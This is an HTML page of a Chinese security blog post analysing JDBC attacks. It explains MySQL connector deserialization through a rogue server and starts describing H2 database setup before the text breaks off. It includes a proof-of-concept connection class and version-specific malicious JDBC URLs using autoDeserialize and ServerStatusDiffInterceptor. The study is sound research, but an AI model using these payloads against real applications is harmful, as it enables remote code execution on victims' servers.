

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
  <link rel="icon" href="/img/favicon.ico">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="EddieMurphy">
  <meta name="keywords" content="">
  
    <meta name="description" content="前言JDBC（Java DataBase Connectivity）是SUN公司发布的一个java程序与数据库之间通信的接口（规范），各大数据库厂商去实现JDBC规范，并将实现类打包成jar包。  由于JDK版本的提升以及依赖包的更新，各种恶意类方面的反序列化都或多或少收到影响，能打的链子也会越来越少，但是JDBC把数据库机制引入，使得在当前大环境下Java漏洞不仅仅局限在java方面，也可以配合">
<meta property="og:type" content="article">
<meta property="og:title" content="JDBC">
<meta property="og:url" content="https://eddiemurphy89.github.io/2024/08/13/JDBC/index.html">
<meta property="og:site_name" content="EddieMurphy&#39;s blog">
<meta property="og:description" content="前言JDBC（Java DataBase Connectivity）是SUN公司发布的一个java程序与数据库之间通信的接口（规范），各大数据库厂商去实现JDBC规范，并将实现类打包成jar包。  由于JDK版本的提升以及依赖包的更新，各种恶意类方面的反序列化都或多或少收到影响，能打的链子也会越来越少，但是JDBC把数据库机制引入，使得在当前大环境下Java漏洞不仅仅局限在java方面，也可以配合">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/Commons-Collections/52834923.png">
<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/Commons-Collections/74856268.png">
<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/Commons-Collections/74917368.png">
<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/Commons-Collections/75009305.png">
<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/Commons-Collections/75118532.png">
<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/Commons-Collections/75141320.png">
<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/Commons-Collections/75959888.png">
<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/Commons-Collections/80049784.png">
<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/Commons-Collections/80102966.png">
<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/Commons-Collections/80357092.png">
<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/Commons-Collections/80414155.png">
<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/Commons-Collections/80443447.png">
<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/Commons-Collections/81204143.png">
<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/Commons-Collections/81216278.png">
<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/Commons-Collections/81226959.png">
<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/Commons-Collections/81240153.png">
<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/Commons-Collections/81326106.png">
<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/Commons-Collections/81406492.png">
<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/Commons-Collections/81531078.png">
<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/Commons-Collections/81544236.png">
<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/Commons-Collections/81602835.png">
<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/Commons-Collections/81626818.png">
<meta property="article:published_time" content="2024-08-13T07:22:00.000Z">
<meta property="article:modified_time" content="2024-08-13T10:19:47.977Z">
<meta property="article:author" content="EddieMurphy">
<meta property="article:tag" content="Java">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://eddiemurphy89.github.io/2024/07/28/Commons-Collections/52834923.png">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>JDBC - EddieMurphy&#39;s blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"eddiemurphy89.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>EddieMurphy&#39;s Blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/chainsaw_man.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="JDBC"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-08-13 15:22" pubdate>
          2024年8月13日 下午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          <!-- compatible with older versions-->
          3.5k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          30 分钟
        
      </span>
    

    
    
      
        <span id="busuanzi_container_page_pv" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="busuanzi_value_page_pv"></span> 次
        </span>
        

      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">JDBC</h1>
            
            
              <div class="markdown-body">
                
                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>JDBC（Java DataBase Connectivity）是SUN公司发布的一个java程序与数据库之间通信的接口（规范），各大数据库厂商去实现JDBC规范，并将实现类打包成jar包。</p>
<p><img src="/2024/07/28/Commons-Collections/52834923.png" srcset="/img/loading.gif" lazyload alt="image-20240813152834923"></p>
<p>由于JDK版本的提升以及依赖包的更新，各种恶意类方面的反序列化都或多或少收到影响，能打的链子也会越来越少，但是JDBC把数据库机制引入，使得在当前大环境下Java漏洞不仅仅局限在java方面，也可以配合数据库方面进行attack，这种方式仍旧经久不衰，足见JDBC攻击的适应性之强。</p>
<p>所以Hessian我还是放到后面再说，这里先把JDBC浅浅引入一下。</p>
<h2 id="MySQL-JDBC"><a href="#MySQL-JDBC" class="headerlink" title="MySQL-JDBC"></a>MySQL-JDBC</h2><h3 id="反序列化分析"><a href="#反序列化分析" class="headerlink" title="反序列化分析"></a>反序列化分析</h3><p>进行数据库连接时指定了数据库的URL及连接配置</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Connection</span> <span class="hljs-variable">con</span> <span class="hljs-operator">=</span> DriverManager.getConnection(<span class="hljs-string">&quot;jdbc:mysql://localhost:3306/test&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>);<br></code></pre></td></tr></table></figure>

<p>若JDBC连接的URL被攻击者控制，就可以让其指向恶意的MySQL服务器</p>
<p>JDBC连接MySQL服务端时，会有几个内置的SQL查询语句会执行，查询的结果集会在MySQL客户端被处理时会调用<code>ObjectInputStream#readObject</code>进行反序列化。</p>
<p>攻击者可以搭建恶意MySQL服务器，返回精心构造的查询结果集，进行客户端反序列化攻击。</p>
<p>可被利用的两条查询语句：</p>
<ul>
<li>SHOW SESSION STATUS</li>
<li>SHOW COLLATION</li>
</ul>
<p>恶意MySQL服务器搭建：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/fnmsd/MySQL_Fake_Server">https://github.com/fnmsd/MySQL_Fake_Server</a> 📌</li>
<li><a target="_blank" rel="noopener" href="https://github.com/rmb122/rogue_mysql_server">https://github.com/rmb122/rogue_mysql_server</a></li>
</ul>
<p>上述工具是模拟MySQL发包过程用的，只需要开对应端口运行脚本就可以了。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.0.13<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.sql.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Class.forName(<span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">jdbc_url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:mysql://127.0.0.1:3306/test?&quot;</span> +<br>            <span class="hljs-string">&quot;autoDeserialize=true&quot;</span> + <span class="hljs-string">&quot;&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_CommonsCollections7_calc&quot;</span>;<br>        <span class="hljs-type">Connection</span> <span class="hljs-variable">con</span> <span class="hljs-operator">=</span> DriverManager.getConnection(jdbc_url, <span class="hljs-string">&quot;yso_CommonsCollections7_calc&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">DriverManager#getConnection<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">connectOneTryOnly=&gt;<span class="hljs-built_in">this</span>.session.setQueryInterceptors(<span class="hljs-built_in">this</span>.queryInterceptors);<br></code></pre></td></tr></table></figure>

<p>设置对应的查询拦截器（即我们指定的<code>ServerStatusDiffInterceptor</code>）</p>
<p>执行查询语句会调用拦截器的<code>preProcess</code>和<code>postProcess</code></p>
<p>判断拦截器是否为空，非空则调用<code>invokeQueryInterceptorsPre</code></p>
<p><img src="/2024/07/28/Commons-Collections/74856268.png" srcset="/img/loading.gif" lazyload alt="image-20240813174856268"></p>
<p><code>invokeQueryInterceptorsPre</code>调用了拦截器的<code>preProcess</code>：</p>
<p><img src="/2024/07/28/Commons-Collections/74917368.png" srcset="/img/loading.gif" lazyload alt="image-20240813174917368"></p>
<p>看到执行了<code>SHOW SESSION STATUS</code>，并将结果（<code>com.mysql.cj.jdbc.result.ResultSetImpl</code>）传入<code>ResultSetUtil#resultSetToMap</code>进行反序列化处理：</p>
<p><img src="/2024/07/28/Commons-Collections/75009305.png" srcset="/img/loading.gif" lazyload alt="image-20240813175009305"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">resultSetToMap</span><span class="hljs-params">(Map mappedValues, ResultSet rs)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>    <span class="hljs-keyword">while</span> (rs.next()) &#123;<br>        mappedValues.put(rs.getObject(<span class="hljs-number">1</span>), rs.getObject(<span class="hljs-number">2</span>));<br>    &#125;<br>&#125;<br><span class="hljs-comment">// getObject(2)</span><br><span class="hljs-keyword">if</span> (field.isBinary() || field.isBlob()) &#123;<br>    <span class="hljs-type">byte</span>[] data = getBytes(columnIndex);<br>&#125;<br></code></pre></td></tr></table></figure>

<p><code>getObject</code>判断MySQL类型为BLOB后，从MySQL服务端获取对应的字节码数据</p>
<p>从MySQL服务端获取到字节码数据后，判断<code>autoDeserialize</code>是否为true（连接URL中设置了<code>autoDeserialize=true</code>）、字节码数据是否为序列化对象（前两个字节为<code>-84</code>和<code>-19</code>标识序列化对象）等，最后调用<code>readObject</code>触发反序列化漏洞</p>
<p><img src="/2024/07/28/Commons-Collections/75118532.png" srcset="/img/loading.gif" lazyload alt="image-20240813175118532"></p>
<p><img src="/2024/07/28/Commons-Collections/75141320.png" srcset="/img/loading.gif" lazyload alt="image-20240813175141320"></p>
<h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><p><code>ServerStatusDiffInterceptor</code>触发。</p>
<h4 id="8-x"><a href="#8-x" class="headerlink" title="8.x&lt;&#x3D;8.0.20"></a>8.x&lt;&#x3D;8.0.20</h4><blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">jdbc:mysql:<span class="hljs-comment">//x.x.x.x:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor</span><br></code></pre></td></tr></table></figure>
</blockquote>
<h4 id="6-x"><a href="#6-x" class="headerlink" title="6.x"></a>6.x</h4><p><code>queryInterceptors</code>改名<code>statementInterceptors</code></p>
<blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">jdbc:mysql:<span class="hljs-comment">//x.x.x.x:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor</span><br></code></pre></td></tr></table></figure>
</blockquote>
<h4 id="5-1-11"><a href="#5-1-11" class="headerlink" title="&gt;&#x3D;5.1.11"></a>&gt;&#x3D;5.1.11</h4><p>包名不含<code>cj</code></p>
<blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">jdbc:mysql:<span class="hljs-comment">//x.x.x.x:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor</span><br></code></pre></td></tr></table></figure>
</blockquote>
<h4 id="5-x"><a href="#5-x" class="headerlink" title="5.x&lt;&#x3D;5.1.10"></a>5.x&lt;&#x3D;5.1.10</h4><p>同上，需要连接后执行查询</p>
<h3 id="detectCustomCollations触发"><a href="#detectCustomCollations触发" class="headerlink" title="detectCustomCollations触发"></a><code>detectCustomCollations</code>触发</h3><h4 id="5-1-29-5-1-40"><a href="#5-1-29-5-1-40" class="headerlink" title="5.1.29~5.1.40"></a>5.1.29~5.1.40</h4><blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">jdbc:mysql:<span class="hljs-comment">//x.x.x.x:3306/test?detectCustomCollations=true&amp;autoDeserialize=true</span><br></code></pre></td></tr></table></figure>
</blockquote>
<h4 id="5-1-19-5-1-28"><a href="#5-1-19-5-1-28" class="headerlink" title="5.1.19~5.1.28"></a>5.1.19~5.1.28</h4><blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">jdbc:mysql:<span class="hljs-comment">//127.0.0.1:3306/test?autoDeserialize=true</span><br></code></pre></td></tr></table></figure>
</blockquote>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://p4d0rn.gitbook.io/java/jdbc-attack/mysql">MySQL JDBC Attack | Java (gitbook.io)</a></p>
<p>[MySQL JDBC反序列化漏洞 <a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2021/04/23/MySQL-JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"> Mi1k7ea ]</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/203086">MySQL JDBC 客户端反序列化漏洞分析-安全客 - 安全资讯平台 (anquanke.com)</a></p>
<h2 id="H2-JDBC"><a href="#H2-JDBC" class="headerlink" title="H2-JDBC"></a>H2-JDBC</h2><p>也曾在HGAME的新生赛上见到了H2数据库的SQL注入&#x3D;&gt;RCE漏洞，而且课内数据库开发我也是用的H2数据库交了一次作业hhh，所以印象还是比较深。</p>
<p>JDBC是JDK提供的一个用于连接数据库的接口(Java DataBase Connectivity)，各个数据库厂商(MySQL、Oracle、SQLServer)负责编写自己的JDBC实现类，再把这些实现类打包为驱动jar包，我们使用JDBC的接口编程，背后调用的实则是实现类里的方法。</p>
<p>常见的JDBC使用方法是在配置文件中写好JDBC引擎、连接数据库的URL、账户、密码。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">JDBC_URL</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:mysql://localhost:3306/test&quot;</span>;  <span class="hljs-comment">//test数据库</span><br><span class="hljs-type">String</span> <span class="hljs-variable">JDBC_USER</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">JDBC_PASSWORD</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;password&quot;</span>;<br><span class="hljs-comment">// 建立连接</span><br><span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> DriverManager.getConnection(JDBC_URL, JDBC_USER,<br>JDBC_PASSWORD);<br><span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> 访问数据库</span><br><span class="hljs-comment">// 关闭连接</span><br>conn.close();<br></code></pre></td></tr></table></figure>

<p>那么JDBC连接的URL怎么能够让用户控制得到呢？实际在一些场景或者渗透测试里，比如后台修改数据库配置、测试数据库连接中，管理员就可以控制JDBC的连接URL。</p>
<p>因此这类漏洞主要是在后台管理(当然第一步得攻进后台，未授权、弱密钥、逻辑漏洞等等等)。</p>
<p>此处介绍h2 database的相关漏洞。</p>
<p>H2是一个用Java编写的数据库，支持内存(有点像sqlite)、文件等模式，只有一个jar文件，适合作为嵌入式数据库使用。主要用于单元测试。H2提供了一个web控制台用于操作和管理数据库。</p>
<h3 id="H2连接"><a href="#H2连接" class="headerlink" title="H2连接"></a>H2连接</h3><p>一般我们会用SpringBoot来整合H2。</p>
<p>h2 database console可以整合到SpringBoot中，也可以独立启动(其内置了一个WebServer)</p>
<p>H2支持运行三种模式：</p>
<p>Embedded(嵌入式)-&gt;无需配置本地&#x2F;远程数据库; 数据库连接关闭时, 数据与表结构依然存在;</p>
<p>In-Memory(内存模式)-&gt;无需配置本地&#x2F;远程数据库, 但数据库连接关闭时，数据与表结构丢失;</p>
<p>ServerMode(传统模式)-&gt;需要配置本地&#x2F;远程数据库;</p>
<h4 id="jar启动"><a href="#jar启动" class="headerlink" title="jar启动"></a>jar启动</h4><p>这里省个事抄了。实际上把h2挂在依赖里，启动项目就能启动H2。</p>
<p>在<a target="_blank" rel="noopener" href="http://www.h2database.com/html/cheatSheet.html">官网</a>下载jar包，调用里面的<code>org.h2.tools.Server</code>类</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">java <span class="hljs-literal">-cp</span> .\h2<span class="hljs-literal">-2</span>.<span class="hljs-number">2.220</span>.jar org.h2.tools.Server <span class="hljs-literal">-help</span><br></code></pre></td></tr></table></figure>

<p><img src="/2024/07/28/Commons-Collections/75959888.png" srcset="/img/loading.gif" lazyload alt="image-20240813175959888"></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">java <span class="hljs-literal">-cp</span> .\h2<span class="hljs-literal">-2</span>.<span class="hljs-number">2.220</span>.jar org.h2.tools.Server <span class="hljs-literal">-web</span> <span class="hljs-literal">-webAllowOthers</span><br></code></pre></td></tr></table></figure>

<p>启动Web console，默认监听8082端口</p>
<p>H2的Web console不仅可以连接H2数据库，也可以连接其他支持JDBC API的数据库</p>
<p><img src="/2024/07/28/Commons-Collections/80049784.png" srcset="/img/loading.gif" lazyload alt="image-20240813180049784"></p>
<p>H2数据库默认用户名为sa、密码为空：</p>
<p><img src="/2024/07/28/Commons-Collections/80102966.png" srcset="/img/loading.gif" lazyload alt="image-20240813180102966"></p>
<h4 id="SpringBoot整合"><a href="#SpringBoot整合" class="headerlink" title="SpringBoot整合"></a>SpringBoot整合</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.h2database<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>h2<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-data-jpa<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.projectlombok<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>lombok<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>在<code>application.properties</code>中添加h2连接的配置</p>
<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">spring.datasource.driver-class-name</span>=<span class="hljs-string">org.h2.Driver</span><br><span class="hljs-attr">spring.datasource.url</span>=<span class="hljs-string">jdbc:h2:mem:test</span><br><span class="hljs-attr">spring.datasource.username</span>=<span class="hljs-string">sa</span><br><span class="hljs-attr">spring.datasource.password</span>=<span class="hljs-string"></span><br><br><span class="hljs-attr">spring.h2.console.enabled</span>=<span class="hljs-string">true</span><br><span class="hljs-attr">spring.h2.console.path</span>=<span class="hljs-string">/h2</span><br><span class="hljs-attr">spring.h2.console.settings.trace</span>=<span class="hljs-string">false</span><br><span 